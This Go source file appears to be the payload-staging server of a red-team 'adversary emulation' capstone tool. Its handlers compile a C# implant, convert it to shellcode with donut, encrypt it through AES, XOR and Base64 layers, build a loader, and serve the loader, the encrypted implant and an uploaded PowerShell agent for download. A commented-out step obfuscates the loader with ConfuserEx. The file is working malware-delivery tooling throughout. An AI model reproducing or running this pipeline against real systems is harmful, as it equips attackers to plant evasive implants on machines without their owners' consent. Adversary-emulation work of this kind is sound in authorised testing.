package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
)

func generateImplant(w http.ResponseWriter, r *http.Request) {
	config, e := LoadConfiguration("aef-profile.json")
	if e != nil {
		log.Fatal("Error loading profile")
	}
	basedirwin := config[0].BasedirWin
	basedirlin := config[0].BasedirLin

	var cmd *exec.Cmd
	fmt.Println("[*] Hit, generating shellcode...")
	fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:" + basedirwin + "donut\\Implant.exe " + basedirwin + "Implant\\Implant.cs " + basedirwin + "Implant\\Modules\\ExecuteAssembly.cs " + basedirwin + "Implant\\Modules\\Commands.cs " + basedirwin + "Implant\\Modules\\CompileAndRunNET.cs && " + basedirwin + "donut\\donut.exe -a 2 --input:" + basedirwin + "donut\\Implant.exe --output:" + basedirwin + "Encryption\\implant.bin")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:"+basedirwin+"donut\\Implant.exe "+basedirwin+"Implant\\Implant.cs "+basedirwin+"Implant\\Modules\\ExecuteAssembly.cs "+basedirwin+"Implant\\Modules\\Commands.cs "+basedirwin+"Implant\\Modules\\CompileAndRunNET.cs && "+basedirwin+"donut\\donut.exe -a 2 --input:"+basedirwin+"donut\\Implant.exe --output:"+basedirwin+"Encryption\\implant.bin")
	} else {
		cmd = exec.Command("/bin/sh", "-c", "mcs -out:/tmp/Implant.exe "+basedirlin+"Implant/Implant.cs && /mnt/f/capstone-adversary-emulation-tool/Implementation/donut/donut --input:/tmp/Implant.exe --output:/tmp/implant.bin")
	}

	err := cmd.Run()

	if err != nil {
		log.Fatal("Error: ", err)
	}

	fmt.Println("Encrypting the Shellcode with: AES-256 -> XOR -> Base64")
	fmt.Println("python " + basedirwin + "Encryption\\Cryptocutter.py -f " + basedirwin + "Encryption\\implant.bin -o " + basedirwin + "OutputShellcode\\implant.bin")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "python "+basedirwin+"Encryption\\Cryptocutter.py -f "+basedirwin+"Encryption\\implant.bin -o "+basedirwin+"OutputShellcode\\implant.bin")
	} else {
		cmd = exec.Command("")
	}

	output, err2 := cmd.Output() // Capture the output of the command
	if err2 != nil {
		log.Fatal("Error: ", err2)
	} else {
		fmt.Println(string(output)) // Print the output
	}

	fmt.Println("[*] Shellcode generated, compiling loader...")
	// fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader\\Loader.cs")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:..\\Loader.exe ..\\Loader\\Loader.cs")
	}

	err3 := cmd.Run()
	if err3 != nil {
		log.Fatal("Error: ", err3)
	}

	// fmt.Println("[*] Encrypting the Loader now...")
	// // fmt.Println("F:\\capstone-adversary-emulation-tool\\Implementation\\neo-ConfuserExbin\\Confuser.CLI.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe -o F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\")
	// if runtime.GOOS == "windows" {
	// 	cmd = exec.Command("cmd", "/c", "C:\\Users\\vquer\\Documents\\Capstone\\Implementation\\neo-ConfuserExbin\\Confuser.CLI.exe C:\\Users\\vquer\\Documents\\Capstone\\Implementation\\Loader.exe -o C:\\Users\\vquer\\Documents\\Capstone\\Implementation\\OutputShellcode\\")
	// }

	// _, err4 := cmd.Output() // Capture the output of the command
	// if err4 != nil {
	// 	log.Fatal("Error: ", err4)
	// }

	fmt.Println("[+] Loader ready, serving for download...")
	// fmt.Println("F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\Loader.exe")
	file, err := os.Open("..\\Loader.exe")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer file.Close()

	// Set the appropriate headers for download
	w.Header().Set("Content-Disposition", "attachment; filename=Loader.exe")
	w.Header().Set("Content-Type", "application/octet-stream")

	// Copy the file contents to the response writer
	io.Copy(w, file)
}

func windowsImplant(w http.ResponseWriter, r *http.Request) {
	fmt.Println("Agent getting downloaded")
	filepath := "..\\OutputShellcode\\implant.bin"
	if _, err := os.Stat(filepath); os.IsNotExist(err) {
		fmt.Println("File does not exist:", err)
		http.Error(w, "File not found.", http.StatusNotFound)
		return
	}
	http.ServeFile(w, r, filepath)

	fmt.Println("Cleaning loader...")
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "python ..\\Encryption\\Cleaner.py")
	}

	err := cmd.Run()
	if err != nil {
		log.Fatal("Error: ", err)
	}
}

func powerShellImplant(w http.ResponseWriter, r *http.Request) {
	filePath := "implants/windows/powershell/agent.ps1"

	if r.Method == http.MethodPost {
		var agent Agent
		err := json.NewDecoder(r.Body).Decode(&agent)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		decoded, err := base64.StdEncoding.DecodeString(agent.Code)
		if err != nil {
			http.Error(w, "Failed to decode base64 string", http.StatusBadRequest)
			return
		}
		agent.Code = string(decoded)
		err = ioutil.WriteFile(filePath, []byte(agent.Code), 0644)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
	} else if r.Method == http.MethodGet {
		fmt.Println("Hit to download powershell script")
		http.ServeFile(w, r, filePath)
	} else {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
	}
}
